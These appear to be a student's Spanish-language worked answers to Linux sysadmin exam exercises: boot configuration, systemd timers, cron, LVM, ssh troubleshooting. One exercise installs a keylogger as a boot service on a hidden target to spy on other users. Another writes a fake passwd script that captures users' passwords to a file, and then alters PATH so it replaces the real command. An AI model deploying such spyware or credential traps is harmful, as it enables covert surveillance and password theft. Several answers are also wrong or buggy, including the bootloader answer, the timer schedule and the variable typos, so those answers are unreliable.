Para arrancar el kernel directamente sin hacer uso de ningún bootloader en un sistema Linux, podemos hacerlo utilizando las herramientas proporcionadas por el propio sistema operativo. Aquí tienes los pasos para hacerlo:

1. **Identificar la Partición Raíz**:
   - Identifica la partición raíz donde está instalado el kernel. Puedes usar el comando `lsblk` para listar las particiones y sus montajes.

2. **Montar la Partición Raíz**:
   - Monta la partición raíz en un directorio temporal. Por ejemplo, si la partición raíz es `/dev/sda1`, puedes montarla en `/mnt` con el siguiente comando:
     ```
     sudo mount /dev/sda1 /mnt
     ```

3. **Configurar el Arranque Directo**:
   - Una vez que la partición raíz esté montada, necesitamos modificar el archivo de configuración del cargador de arranque (generalmente GRUB) para que cargue el kernel directamente. El archivo de configuración suele estar en `/boot/grub/grub.cfg`. Abre este archivo en un editor de texto. Por ejemplo:
     ```
     sudo nano /mnt/boot/grub/grub.cfg
     ```

4. **Modificar el Archivo de Configuración**:
   - Dentro del archivo `grub.cfg`, busca la sección que define las entradas de arranque. Debes buscar las líneas que empiezan con `menuentry`. Cada una de estas líneas representa una entrada de arranque. Busca la línea correspondiente al kernel que deseas arrancar directamente.

5. **Editar la Entrada de Arranque**:
   - Edita la línea correspondiente al kernel que deseas arrancar directamente. Debes eliminar las opciones relacionadas con el cargador de arranque, como `set root`, `linux`, `initrd`, etc., y dejar solo las opciones relacionadas con el kernel. Por ejemplo:
     ```
     linux /vmlinuz-5.4.0-88-generic root=/dev/sda1 ro quiet splash
     ```

6. **Guardar y Salir**:
   - Guarda los cambios en el archivo y sal de tu editor de texto.

7. **Desmontar la Partición Raíz**:
   - Desmonta la partición raíz del directorio temporal:
     ```
     sudo umount /mnt
     ```

8. **Reiniciar el Sistema**:
   - Reinicia el sistema para que los cambios surtan efecto. El sistema debería arrancar directamente desde el kernel sin mostrar el menú de GRUB.

## Ejercicio 2 TEMAS: redes, script, system units
Arranca la máquina desde el snapshot Ej2Begin. En el directorio $HOME del usuario root crea un script de nombre checkdhcp.sh. Su función será comprobar si los servicios de red han funcionado correctamente y el equipo tiene una dirección IP asignada en el interfaz enp0s3 bajo configuración automática (dhcp). En caso de no tener IP definida, aplicará una configuración manual a dicho interfaz con los siguientes parámetros: dirección=10.0.2.15 máscara de red=255.255.255.0, broadcast=10.0.2.255, Gateway=10.0.2.2. A través de un timer de systemd de nombre dchp_check.timer, haz que tu script se ejecute cada hora durante la jornada laboral (entre las 8:00 y las 17:00, de lunes a viernes). 

Para completar este ejercicio, primero necesitamos crear el script `checkdhcp.sh` en el directorio `$HOME` del usuario `root`, y luego configurar un timer de systemd para que este script se ejecute cada hora durante la jornada laboral de lunes a viernes.

Aquí están los pasos para lograrlo:

1. **Crear el script checkdhcp.sh**:
   - Primero, accede al directorio `$HOME` del usuario `root`:
     ```bash
     cd /root
     ```
   - Luego, crea y edita el script `checkdhcp.sh` con tu editor de texto preferido. Por ejemplo:
     ```bash
     nano checkdhcp.sh
     ```
   - Agrega el siguiente contenido al script:
     ```bash
     #!/bin/bash
     
     # Comprobar si la interfaz enp0s3 tiene una IP asignada mediante DHCP
     if [[ $(ip addr show enp0s3 | grep -c "inet ") -eq 0 ]]; then
         # Si no tiene IP, aplicar configuración manual
         ip addr add 10.0.2.15/24 broadcast 10.0.2.255 dev enp0s3
         ip route add default via 10.0.2.2
     fi
     ```
   - Guarda y cierra el archivo (`Ctrl + O`, `Enter`, `Ctrl + X` en nano).

2. **Dar permisos de ejecución al script**:
   - Para asegurarnos de que el script sea ejecutable, utilizamos el comando `chmod`:
     ```bash
     chmod +x checkdhcp.sh
     ```

3. **Configurar el timer de systemd**:
   - Crearemos un archivo de unidad para el timer de systemd. Por ejemplo:
     ```bash
     sudo nano /etc/systemd/system/dhcp_check.timer
     ```
   - Agrega el siguiente contenido:
     ```plaintext
     [Unit]
     Description=Timer for running checkdhcp.sh every hour during working hours

     [Timer]
     OnCalendar=Mon-Fri 08:00:00
     Persistent=true

     [Install]
     WantedBy=timers.target
     ```
   - Guarda y cierra el archivo (`Ctrl + O`, `Enter`, `Ctrl + X` en nano).

4. **Enlazar el timer con el servicio**:
   - Ahora, creamos un archivo de unidad para el servicio asociado al timer:
     ```bash
     sudo nano /etc/systemd/system/dhcp_check.service
     ```
   - Agrega el siguiente contenido:
     ```plaintext
     [Unit]
     Description=Script to check and configure DHCP on enp0s3 interface

     [Service]
     Type=oneshot
     ExecStart=/root/checkdhcp.sh
     ```
   - Guarda y cierra el archivo (`Ctrl + O`, `Enter`, `Ctrl + X` en nano).

5. **Recargar systemd y habilitar el timer**:
   - Después de crear los archivos de unidad, recargamos systemd para que reconozca los cambios:
     ```bash
     sudo systemctl daemon-reload
     ```
   - Luego, habilitamos el timer para que se ejecute automáticamente:
     ```bash
     sudo systemctl enable --now dhcp_check.timer
     ```

Con estos pasos, hemos creado un script `checkdhcp.sh` que verifica si la interfaz `enp0s3` tiene una dirección IP asignada mediante DHCP, y si no la tiene, aplica una configuración manual. Además, hemos configurado un timer de systemd para que este script se ejecute cada hora durante la jornada laboral de lunes a viernes.

## Ejercicio 3 TEMAS: system units, comandos "hack"
Ejercicio 4 (2p) Arranca la máquina desde el snapshot Ej4Begin. Como administrador, tienes un control prácticamente absoluto sobre lo que otros usuarios hacen. Para demostrarlo con un ejemplo práctico, en este ejercicio vas a instalar un capturador de teclado (keylogger) para espiar” lo que escriben el resto de usuarios. Instala el keylogger del siguiente enlace: `https://github.com/kernc/logkeys`, y crea un servicio, de nomber keyl.service, que active dicho keylogger en arranque y lo desactive al apagar la máquina. Como lo que estás haciendo no es muy legal, crea un target de arranque alternativo (multi-user-cotilla.target) que funcione exactamente igual que multi-user.target, con la única diferencia que tu servicio solo se activará con tu target “cotilla”. Cambia el target de arranque por defecto al que has creado y comprueba que todo funciona correctamente tecleando algún comando como usuario jalberto (password jalberto) desde un segundo terminal. 

Aquí tienes los pasos para completar el ejercicio:

1. **Descarga e Instalación de Logkeys**:
   - Descarga el código fuente de Logkeys desde el enlace proporcionado:
     ```bash
     wget https://github.com/kernc/logkeys/archive/master.zip
     ```
   - Descomprime el archivo descargado:
     ```bash
     unzip master.zip
     ```
   - Accede al directorio recién descomprimido:
     ```bash
     cd logkeys-master
     ```
   - Instala las dependencias necesarias:
     ```bash
     sudo apt install build-essential automake autoconf libtool
     ```
   - Compila e instala Logkeys:
     ```bash
     autoreconf --force --install
     ./configure
     make
     sudo make install
     ```

2. **Creación del Servicio keyl.service**:
   - Crea y edita el archivo de servicio keyl.service:
     ```bash
     sudo nano /etc/systemd/system/keyl.service
     ```
   - Agrega el siguiente contenido al archivo:
     ```plaintext
     [Unit]
     Description=Keylogger Service
     After=multi-user.target

     [Service]
     Type=simple
     ExecStart=/usr/local/bin/logkeys --start --output /var/log/keystrokes.log
     ExecStop=/usr/local/bin/logkeys --kill

     [Install]
     WantedBy=multi-user-cotilla.target
     ```
   - Guarda y cierra el archivo.

3. **Creación del Target multi-user-cotilla.target**:
   - Copia el archivo de unidad `multi-user.target` a uno nuevo llamado `multi-user-cotilla.target`:
     ```bash
     sudo cp /lib/systemd/system/multi-user.target /etc/systemd/system/multi-user-cotilla.target
     ```
   - Edita el archivo `multi-user-cotilla.target`:
     ```bash
     sudo nano /etc/systemd/system/multi-user-cotilla.target
     ```
   - Cambia `WantedBy` para que apunte al nuevo servicio:
     ```plaintext
     [Install]
     WantedBy=multi-user-cotilla.target
     ```
   - Guarda y cierra el archivo.

4. **Cambiar el Target de Arranque por Defecto**:
   - Cambia el enlace simbólico `default.target` para que apunte al nuevo target `multi-user-cotilla.target`:
     ```bash
     sudo ln -sf /etc/systemd/system/multi-user-cotilla.target /etc/systemd/system/default.target
     ```

5. **Habilitar y Comprobar el Servicio**:
   - Habilita el servicio keyl.service para que se inicie automáticamente al arrancar:
     ```bash
     sudo systemctl enable keyl.service
     ```
   - Comprueba el estado del servicio para asegurarte de que esté activo:
     ```bash
     sudo systemctl status keyl.service
     ```

Una vez completados estos pasos, el keylogger se activará al arrancar la máquina y se desactivará al apagarla, pero solo cuando el sistema se inicie con el target `multi-user-cotilla.target`. Es importante tener en cuenta las implicaciones éticas y legales de monitorear las acciones de otros usuarios sin su consentimiento.

# Ordinaria 20-21

## Ejercicio 1 TEMAS: scripts
Arranca la máquina desde el snapshot Ej1Begin. Deberás crear un script de nombre “ejercicio1.sh” para automatizar la gestión de diferentes usuarios. Dicho script realizará las siguientes funciones: 

1. El script recibirá por línea de comandos dos parámetros. Primero el id del usuario, segundo un comando (por ejemplo: ./ejercicio1.sh pepe tmux). Si el usuario no existe en el sistema retornará un mensaje de error. 

2. El objetivo principal del script será determinar si dicho usuario está ejecutando el comando que se ha pasado como argumento. En caso afirmativo, se procederá a matar de manera inmediata el proceso asociado a dicho comando y se escribirá un mensaje con información sobre dicho evento (usuario, comando, fecha) en el fichero /var/log/cmdprohibido.log.   

3. Crea una tarea programada con cron que ejecute dicho script cada 5 minutos. El usuario a controlar será test y el comando prohibido será stress. Para controlar el tamaño asociado al fichero de log creado, configura un proceso de rotación semanal, limitando los mensajes almacenados a los generados durante el último mes. 
Puedes probar el funcionamiento de tu script con el usuario test y el comando stress. 

Primero crearemos una versión sencilla del script

```sh
#!/bin/bash

#Recibimos dos parametros
# $1 = id usuario
# $2 = comando

if id "$1" >/dev/null 2>&1; then 
   USERID=$1
else 
   echo "user does not exist" 
   #return null
fi
#mirar si estamos corriendo el comando
COMMAND=$2
# -n "not null"

#pgrep is a command-line utility in Unix that searches the running processes on a system based on their names and other attributes. It returns the process IDs that match the criteria.
PD=$(pgrep -u $USERID $COMMAND)
if [-n "$PID"]; then
   kill $PID
   echo "User: $USERID, Command: $COMMAND, Date: $(date)" >> /var/log/cmdprohibido.log
fi
```
Comando pgrep [pregp](https://linuxize.com/post/pgrep-command-in-linux/)
Comando cron [cron crontab](https://www.redeszone.net/tutoriales/servidores/cron-crontab-linux-programar-tareas/#447735-que-es-cron)

```
crontab -e  # entramos a la configuracion de crontab para anhadir la linea

*/5 * * * * /path/to/ejercicio1.sh test stress
```

Para lo del log tenemos que crear un fichero em `/etc/logrotate.d/` con el contenido:
```sh
/var/log/cmdprohibido.log {
    weekly
    rotate 4
}
```

## Extraordinaria 20-21
## Ejercicio 1 TEMAS: particiones, system units
Arranca la máquina desde el snapshot Ej1Begin. Utiliza los tres discos disponibles (sdb, sdc, sdd), de 500MB cada uno, para crear un volumen de grupo que albergará dos volúmenes lógicos. El primer volumen lógico, de 1GB de tamaño, albergará un sistema de ficheros que sustituirá al directorio /home actual (montado permanente, el contenido previo de /home debe estar presente en el nuevo punto de montaje). En el segundo volumen lógico, que utilizará la capacidad restante y se monta de manera permanente en /swap, albergará un fichero de swap de 250MB que debes crear y habilitar a través de systemd.

1. Crearemos un grupo de volumenes fisicos con los tres discos disponibles.
```sh
pvcreate /dev/sdb /dev/sdc /dev/sdd
```

2. Ahora crearemos un grupo de volúmenes con los volúmenes físicos que hemos creado.
```sh
vgcreate myvg /dev/sdb /dev/sdc /dev/sdd
```

3. Ahora creamos los volumenes logicos, el primero de 1 GB y el segundo de lo que quede.
```sh
lvcreate -L 1G -n home myvg
lvcreate -l 100%FREE -n swap myvg
```

4. Creamos sistemas de archivos en los volúmenes lógicos
```sh
mkfs.ext4 /dev/myvg/home
mkswap /dev/myvg/swap
```
5. Movemos el contenido de /home a un directorio temporal para no perderlo. Montamos el nuevo volumen logico en Home y lo traemos de vuelta (el contenido).
```sh
mv /home /home_old
mkdir /home
mount /dev/myvg/home /home
mv /home_old/* /home/
```
6. Creamos un archivo de swap en el segundo volumen lógico y habilitamos el swap.
```sh
dd if=/dev/zero of=/swap/swapfile bs=1M count=250
chmod 600 /swap/swapfile
mkswap /swap/swapfile
swapon /swap/swapfile
```

7. Para hacer los cambios permanentes hay que escribir en `/etc/fstab`. Añadimos en este fichero las líneas:
```sh
/dev/myvg/home /home ext4 defaults 0 0
/swap/swapfile swap swap defaults 0 0
```

8. Finalmente, para habilitar el swap a través de systemd, crea un archivo de servicio systemd en /etc/systemd/system/swapfile.service con el siguiente contenido:
```sh
[Unit]
Description=Turn on swap

[Service]
Type=oneshot
ExecStart=/sbin/swapon /swap/swapfile

[Install]
WantedBy=multi-user.target
```
Y lo habilitamos con `systemctl enable swapfile.service`.

## Ejercicio 3 TEMAS: servicio que falla
Arranca la máquina desde el snapshot Ej3Begin. Comprobarás que el servicio ssh.service ha sufrido algún tipo de problema durante el proceso de arranque. Busca el origen del problema y lleva a cabo los cambios necesarios para corregirlo. 

Aquí están los pasos que puedes seguir para solucionar el problema con el servicio ssh:

Comprueba el estado del servicio ssh con el siguiente comando:
```sh
systemctl status ssh.service
```
Esto te dará información sobre el estado actual del servicio y cualquier error que pueda haber ocurrido durante el arranque.

Si el servicio no está activo, intenta iniciarlo manualmente con el siguiente comando:
```sh
systemctl start ssh.service
```

Si hay algún problema con el servicio, este comando debería darte un error que te ayudará a identificar el problema.

Revisa los logs del sistema para obtener más información sobre el problema. Puedes hacer esto con el siguiente comando:
```sh
journalctl -u ssh.service
```
Esto te mostrará los logs del servicio ssh, que pueden contener información útil sobre el problema.

Una vez que hayas identificado el problema, puedes hacer los cambios necesarios para corregirlo. Esto puede implicar editar la configuración de ssh, cambiar los permisos de los archivos clave, o reinstalar el servicio ssh.

Después de hacer los cambios, reinicia el servicio ssh con el siguiente comando:
```sh
systemctl restart ssh.service
```

Esto debería iniciar el servicio ssh con tu nueva configuración.

Finalmente, comprueba de nuevo el estado del servicio ssh para asegurarte de que se está ejecutando correctamente:
```sh
systemctl status ssh.service
```
Si el servicio está activo y no hay errores en los logs, entonces has solucionado el problema con éxito.

## Ejercicio 4

Arranca la máquina desde el snapshot Ej4Begin. El administrador ha cometido una imprudencia, consistente en conceder permisos de escritura sobre el directorio /usr/local/bin. Dicho directorio es uno de los que se incluyen en la variable $PATH de los nuevos usuarios, lo que les permite crear falsos comandos para obtener información privilegiada. Tu objetivo es, como usuario test (temporal), crear un script de nombre passwd, que emule el comportamiento del comando de mismo nombre, y te sirva para apropiarte de las claves del resto de usuarios. Ten en cuenta los siguientes aspectos: 

1. Revisa el funcionamiento y el tipo de mensajes que imprime por pantalla el comando passwd (para imitarlos). Ten en cuenta que un usuario solo es capaz de cambiar su propia contraseña, y no la de otros usuarios. Ten también en cuenta que la nueva contraseña se solicita dos veces, y si ambos strings no coinciden se produce un mensaje de error. 
2. Guarda el usuario/contraseña capturados en tu $HOME, en un fichero oculto (.datos.txt). 
3. El cambio de contraseña SI debe producirse, por lo que debes reescribir la entrada del shadow para el usuario que cambia la contraseña (introducir la nueva contraseña). Busca online la forma de ejecutar el comando passwd desde un script para poder hacer este cambio. 
4. Haz que éste sea el comando que se ejecuta por defecto en el sistema y comprueba con el usuario test2 (temporal2) su funcionamiento. 

Debemos contemplar varios casos:
1. Pide cambiar la contraseña de otro:
```
test@LAPTOP-OR195PNE:~$ passwd ramon
passwd: no debe ver o cambiar la información de la contraseña para ramon.
```

2. La contraseña se pide dos veces y debe coincidir (caso bueno)
```sh
test@LAPTOP-OR195PNE:~$ passwd test
Cambiando la contraseña de test.
Contraseña actual:
Nueva contraseña:
Vuelva a escribir la nueva contraseña:
passwd: contraseña actualizada correctamente
```
Caso malo:
```sh
test@LAPTOP-OR195PNE:~$ passwd test
Cambiando la contraseña de test.
Contraseña actual:
Nueva contraseña:
Vuelva a escribir la nueva contraseña:
Las contraseñas no coinciden.
passwd: Error de manipulación del testigo de autenticación
passwd: no se ha cambiado la contraseña
```

Escribimos e script:
```sh
#!/bin/bash

#primer mensaje
echo -n "Cambiando la contraseña de "; whoami

echo -n "Contraseña actual: "
read -s pass1
printf '\n'

# Verificar la contraseña actual
echo "$pass1" | su -s /bin/bash -c "exit" `whoami` >/dev/null 2>&1
if [ $? -ne 0 ]; then
    echo "La contraseña actual es incorrecta."
    exit 1
fi

echo -n "Nueva contraseña: "
read -s pass2
printf '\n'

echo -n "Vuelva a escribir la nueva contraseña: "
read -s pass3
printf '\n'

if [ $pass2 = $pass3 ]; then
    echo -e "`whoami`:$pass3" | chpasswd > error.txt
    echo "passwd: contraseña actualizada correctamente"

    echo -n "Usuario: " >> datos.txt
    whoami >> datos.txt
    echo -n "Contraseña actual: " >> datos.txt
    echo $pass2 >> datos.txt
    echo -n "Contraseña anterior: " >> datos.txt
    echo $pass1 >> datos.txt
    exit 0
else
    echo "Las contraseñas no coinciden."
    echo "passwd: Error de manipulación del testigo de autenticación"
    echo "passwd: no se ha cambiado la contraseña"

    echo -n "Usuario: " >> datos.txt
    whoami >> datos.txt
    echo -n "Contraseña actual: " >> datos.txt
    echo $pass1 >> datos.txt
fi
```

No va bien el script pero es lo mejor que pude conseguir
Deberemos cambiar la variable path de los usuarios para que ejecute este comando en vez de passwd original.

Para cambiar la variable PATH para todos los usuarios en un sistema Linux, puedes agregar o modificar las declaraciones de exportación en un archivo de script de shell en el directorio `/etc/profile.d/`.

Aquí hay un ejemplo de cómo puedes hacerlo:

1. Abre un nuevo archivo en el directorio `/etc/profile.d/` con privilegios de superusuario. Puedes llamar a este archivo `custom_path.sh`:

```bash
sudo nano /etc/profile.d/custom_path.sh
```

2. En este archivo, agrega la siguiente línea para agregar tu directorio personalizado al principio de la variable PATH:

```bash
export PATH=/ruta/a/tu/directorio:$PATH
```

Reemplaza `/ruta/a/tu/directorio` con la ruta al directorio que quieres agregar a la variable PATH.

3. Guarda y cierra el archivo.

4. Haz que el script sea ejecutable con el siguiente comando:

```bash
sudo chmod +x /etc/profile.d/custom_path.sh
```

Después de hacer esto, la ruta que agregaste será parte de la variable PATH para todos los usuarios. Sin embargo, los cambios no tendrán efecto hasta que los usuarios cierren y vuelvan a abrir su sesión, o hasta que ejecuten el comando `source /etc/profile.d/custom_path.sh`.

Ten en cuenta que este método cambiará la variable PATH para todos los usuarios, incluido el superusuario. Si solo quieres cambiar la variable PATH para usuarios normales, puedes considerar agregar la declaración de exportación a `~/.bashrc` o `~/.bash_profile` en lugar de `/etc/profile.d/`.


